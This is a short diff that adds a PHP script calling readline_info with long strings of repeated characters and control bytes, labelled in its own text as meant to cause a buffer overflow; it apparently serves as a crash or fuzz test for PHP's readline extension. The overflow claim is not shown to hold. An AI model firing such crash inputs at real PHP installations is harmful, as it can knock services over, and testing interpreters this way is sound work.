@@ -1,0 +1,4 @@
+<?php
+readline_info(str_repeat(chr(0x1F). "This is not a valid format string", 0x100), str_repeat("A", 0x100). chr(0x1F). "This will cause a buffer overflow");
+
+?>
